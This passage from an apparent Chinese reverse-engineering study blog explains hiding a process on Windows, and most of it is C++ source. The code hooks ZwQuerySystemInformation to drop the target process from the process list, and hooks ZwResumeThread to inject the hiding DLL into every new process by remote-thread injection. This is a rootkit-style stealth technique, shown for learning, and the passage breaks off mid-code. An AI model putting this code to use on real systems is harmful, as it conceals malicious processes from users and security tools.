class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">inject</span>((DWORD)_tstol(argv[<span class="number">1</span>]), argv[<span class="number">2</span>]))</span><br><span class="line">_tprintf(_T(<span class="string">&quot;inject %s success!\n&quot;</span>), argv[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;inject %s failed! \n&quot;</span>), argv[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2025/02/27/ExOAXnoB3Lyhp2d.png" alt="image-20250227181313876"></p><p>可以看到进程查看器中显示已经注入成功</p>]]></content>
    
    
    <summary type="html">WIN7以上直接createRemoteThread不可以注入会话0的进程</summary>
    
    
    
    <category term="逆向工程核心原理" scheme="https://www.pri87.vip/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"/>
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="逆向" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/"/>
    
    <category term="技能" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/"/>
    
    <category term="DLL注入" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/DLL%E6%B3%A8%E5%85%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>《逆核》0B-进程隐藏</title>
    <link href="https://www.pri87.vip/posts/88758528.html"/>
    <id>https://www.pri87.vip/posts/88758528.html</id>
    <published>2025-02-24T07:09:37.000Z</published>
    <updated>2025-02-27T04:17:33.748Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原理">原理</h2><p>每个进程可以通过ZwQuerySystemInformation API函数获取运行中所有有关进程的结构体链表，<br>通过Hook其它所有进程的ZwQuerySystemInformation API，使其在返回前先删掉想要隐藏进程的结构体，从而实现隐藏进程</p><p>但是如果只有这样，那么后创建的进程依然能识别到，所以除了直接hook ZwQuerySystemInformation ，还要hook创建进程的函数，这里选择的是ZwResumeThread api，通过hook这个api，任何一个进程在执行它时先执行hook新进程的ZwQuerySystemInformation 实现新进程也被hook的效果。</p><h2 id="具体流程">具体流程</h2><p>写一个dll，效果是</p><ul><li>hook本进程的ZwQuerySystemInformation函数，隐藏结构体</li><li>hook本进程的ZwResumeThread函数，注入这个DLL</li></ul><p>写一个全进程注入器，把这个dll注入所有进程</p><p>隐藏结构体的方式是</p><p>NtQuerySystemInformation函数在SystemInformationClass参数为5时会在SystemInformation返回PSYSTEM_PROCESS_INFORMATION型结构体链表头，每个结构体都保存了一个当前正在运行的进程，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_PROCESS_INFORMATION</span> &#123;</span></span><br><span class="line">    ULONG NextEntryOffset;</span><br><span class="line">    ULONG NumberOfThreads;</span><br><span class="line">    BYTE Reserved1[<span class="number">48</span>];</span><br><span class="line">    UNICODE_STRING ImageName;</span><br><span class="line">    KPRIORITY BasePriority;</span><br><span class="line">    HANDLE UniqueProcessId;</span><br><span class="line">    PVOID Reserved2;</span><br><span class="line">    ULONG HandleCount;</span><br><span class="line">    ULONG SessionId;</span><br><span class="line">    PVOID Reserved3;</span><br><span class="line">    SIZE_T PeakVirtualSize;</span><br><span class="line">    SIZE_T VirtualSize;</span><br><span class="line">    ULONG Reserved4;</span><br><span class="line">    SIZE_T PeakWorkingSetSize;</span><br><span class="line">    SIZE_T WorkingSetSize;</span><br><span class="line">    PVOID Reserved5;</span><br><span class="line">    SIZE_T QuotaPagedPoolUsage;</span><br><span class="line">    PVOID Reserved6;</span><br><span class="line">    SIZE_T QuotaNonPagedPoolUsage;</span><br><span class="line">    SIZE_T PagefileUsage;</span><br><span class="line">    SIZE_T PeakPagefileUsage;</span><br><span class="line">    SIZE_T PrivatePageCount;</span><br><span class="line">    LARGE_INTEGER Reserved7[<span class="number">6</span>];</span><br><span class="line">&#125; SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;</span><br></pre></td></tr></table></figure><p>其中ImageName.buffer为wchar_t类型的进程名，NextEntryOffset为和下一个结构体节点相差的字节数，通过这个来连接，如果为0说明没有后继节点，只要通过这个把想要隐藏的隐藏掉即可</p><p>第二点，勾取ZwResumeThread时，应该先注入后恢复，同时注意注入时并不是在新线程内部注入，而是作为父进程远程线程注入</p><h2 id="实现">实现</h2><p>dll代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntstatus.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/SECTION:.SHARED,RWS&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.SHARE&quot;</span>)</span></span><br><span class="line">TCHAR g_szProcName[<span class="number">256</span>] = &#123;&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">__declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">setProcName</span><span class="params">(LPCTSTR szProcName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">_tcscpy_s(g_szProcName, szProcName);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//PZwQuerySystemInformation</span></span><br><span class="line"><span class="comment">//00007FFBF7E50A70  mov         r10, rcx</span></span><br><span class="line"><span class="comment">//00007FFBF7E50A73  mov         eax, 36h</span></span><br><span class="line"><span class="comment">//00007FFBF7E50A78  test        byte ptr[7FFE0308h], 1</span></span><br><span class="line"><span class="comment">//00007FFBF7E50A80  jne         00007FFBF7E50A85</span></span><br><span class="line"><span class="comment">//00007FFBF7E50A82  syscall</span></span><br><span class="line"><span class="comment">//00007FFBF7E50A84  ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BYTE orgBytesA[<span class="number">14</span>];</span><br><span class="line">BYTE orgBytesB[<span class="number">14</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PZwQuerySystemInformation)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG SystemInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID SystemInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG SystemInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">PULONG ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PZwResumeThread)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE threadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">PULONG SuspendCount</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_THREAD_BASIC_INFORMATION</span> &#123;</span><br><span class="line">NTSTATUS ExitStatus;</span><br><span class="line">PVOID TebBaseAddress;</span><br><span class="line">CLIENT_ID ClientId;</span><br><span class="line">KAFFINITY AffinityMask;</span><br><span class="line">KPRIORITY Priority;</span><br><span class="line">KPRIORITY BasePriority;</span><br><span class="line">&#125; THREAD_BASIC_INFORMATION;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">FARPROC <span class="title">getProc</span><span class="params">(std::string moduleName, std::string processName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(moduleName.<span class="built_in">c_str</span>()), processName.<span class="built_in">c_str</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">hookByCode</span><span class="params">(std::string moduleName, std::string processName, PROC pFuncNew, PBYTE orgBytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BYTE jmpcode[<span class="number">14</span>] = &#123; <span class="number">0xff</span>,<span class="number">0x25</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span> &#125;;</span><br><span class="line">FARPROC orgFunc = <span class="built_in">getProc</span>(moduleName, processName);</span><br><span class="line">PBYTE pOrgFunc = <span class="built_in">reinterpret_cast</span>&lt;PBYTE&gt;(orgFunc);</span><br><span class="line"><span class="keyword">if</span> (pOrgFunc[<span class="number">0</span>] == <span class="number">0xff</span> &amp;&amp; pOrgFunc[<span class="number">1</span>] == <span class="number">0x25</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwOldProtect;</span><br><span class="line"></span><br><span class="line"><span class="built_in">VirtualProtect</span>(pOrgFunc, <span class="number">14</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//保存原始代码</span></span><br><span class="line"><span class="built_in">memcpy</span>(orgBytes, pOrgFunc, <span class="number">14</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//8BYTE跳转为绝对地址</span></span><br><span class="line">DWORD64 targetAddr = <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(pFuncNew);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(&amp;jmpcode[<span class="number">6</span>], &amp;targetAddr, <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(pOrgFunc, jmpcode, <span class="number">14</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">VirtualProtect</span>(pOrgFunc, <span class="number">14</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">unhookByCode</span><span class="params">(std::string moduleName, std::string processName, PBYTE orgBytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">FARPROC orgFunc = <span class="built_in">getProc</span>(moduleName, processName);</span><br><span class="line">PBYTE pOrgFunc = <span class="built_in">reinterpret_cast</span>&lt;PBYTE&gt;(orgFunc);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(pOrgFunc[<span class="number">0</span>] == <span class="number">0xff</span> &amp;&amp; pOrgFunc[<span class="number">1</span>] == <span class="number">0x25</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD dwOldProtect;</span><br><span class="line"></span><br><span class="line"><span class="built_in">VirtualProtect</span>(pOrgFunc, <span class="number">14</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(pOrgFunc, orgBytes, <span class="number">14</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">VirtualProtect</span>(pOrgFunc, <span class="number">14</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">myZwQuerySystemInformation</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG SystemInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID SystemInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG SystemInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">PULONG ReturnLength)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">unhookByCode</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;NtQuerySystemInformation&quot;</span>, &amp;orgBytesA[<span class="number">0</span>]);</span><br><span class="line">PZwQuerySystemInformation pZwQuerySystemInformation = <span class="built_in">reinterpret_cast</span>&lt;PZwQuerySystemInformation&gt;(<span class="built_in">getProc</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwQuerySystemInformation&quot;</span>));</span><br><span class="line">NTSTATUS status = <span class="built_in">pZwQuerySystemInformation</span>(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);</span><br><span class="line"><span class="keyword">if</span> (status != STATUS_SUCCESS)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> end;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (SystemInformationClass == <span class="number">5</span> &amp;&amp; g_szProcName[<span class="number">0</span>] != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">PSYSTEM_PROCESS_INFORMATION pInfo = <span class="built_in">static_cast</span>&lt;PSYSTEM_PROCESS_INFORMATION&gt;(SystemInformation);</span><br><span class="line">PSYSTEM_PROCESS_INFORMATION pNextInfo = <span class="built_in">reinterpret_cast</span>&lt;PSYSTEM_PROCESS_INFORMATION&gt;(<span class="built_in">reinterpret_cast</span>&lt;PBYTE&gt;(pInfo) + pInfo-&gt;NextEntryOffset);</span><br><span class="line"><span class="keyword">while</span> (pNextInfo-&gt;NextEntryOffset)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!_tcsicmp(pNextInfo-&gt;ImageName.Buffer, g_szProcName))</span><br><span class="line">&#123;</span><br><span class="line">pInfo-&gt;NextEntryOffset += pNextInfo-&gt;NextEntryOffset;</span><br><span class="line">&#125;</span><br><span class="line">pInfo = pNextInfo;</span><br><span class="line">pNextInfo = <span class="built_in">reinterpret_cast</span>&lt;PSYSTEM_PROCESS_INFORMATION&gt;(<span class="built_in">reinterpret_cast</span>&lt;PBYTE&gt;(pInfo) + pInfo-&gt;NextEntryOffset);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">end:</span><br><span class="line"><span class="built_in">hookByCode</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwQuerySystemInformation&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;PROC&gt;(myZwQuerySystemInformation), &amp;orgBytesA[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">inject</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="number">0</span>, hThread = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!(hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID))) &#123; <span class="comment">// 取得对应 PID 句柄</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;Open process %d failed\n&quot;</span>), dwPID);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line"></span><br><span class="line">LPVOID pBuf = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (pBuf == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;Memory allocation failed in process %d\n&quot;), dwPID);</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, pBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>)) &#123;</span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;WriteProcessMemory failed in process %d\n&quot;), dwPID);</span></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HMODULE hKernel32 = <span class="built_in">GetModuleHandle</span>(_T(<span class="string">&quot;kernel32.dll&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (hKernel32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;GetModuleHandle failed\n&quot;));</span></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LPTHREAD_START_ROUTINE pThreadProc = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(hKernel32, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pThreadProc == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;GetProcAddress failed\n&quot;));</span></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;CreateRemoteThread failed in process %d\n&quot;), dwPID);</span></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">1500</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;DLL injected successfully into process %d\n&quot;), dwPID);</span></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">myZwResumeThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE threadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">PULONG SuspendCount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* ZwQueryInformationThread_t)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD ThreadInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID ThreadInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG ThreadInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">PULONG ReturnLength OPTIONAL</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line">THREAD_BASIC_INFORMATION tbi;</span><br><span class="line">FARPROC pqit = <span class="built_in">getProc</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwQueryInformationThread&quot;</span>);</span><br><span class="line">NTSTATUS statusThread = <span class="built_in">reinterpret_cast</span>&lt;ZwQueryInformationThread_t&gt;(pqit)(threadHandle, <span class="number">0</span>, &amp;tbi, <span class="built_in">sizeof</span>(tbi), <span class="literal">NULL</span>);</span><br><span class="line">DWORD dwPid = <span class="built_in">reinterpret_cast</span>&lt;DWORD&gt;(tbi.ClientId.UniqueProcess);</span><br><span class="line">DWORD dwPrevPid = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (dwPid != <span class="built_in">GetCurrentProcessId</span>() &amp;&amp; dwPid != dwPrevPid)</span><br><span class="line">&#123;</span><br><span class="line">dwPrevPid = dwPid;</span><br><span class="line"><span class="built_in">inject</span>(dwPid, <span class="string">L&quot;C:\\Users\\a2879\\source\\repos\\HideProcess\\x64\\Debug\\HideProcess.dll&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">unhookByCode</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwResumeThread&quot;</span>, &amp;orgBytesB[<span class="number">0</span>]);</span><br><span class="line">PZwResumeThread pZwResumeThread = <span 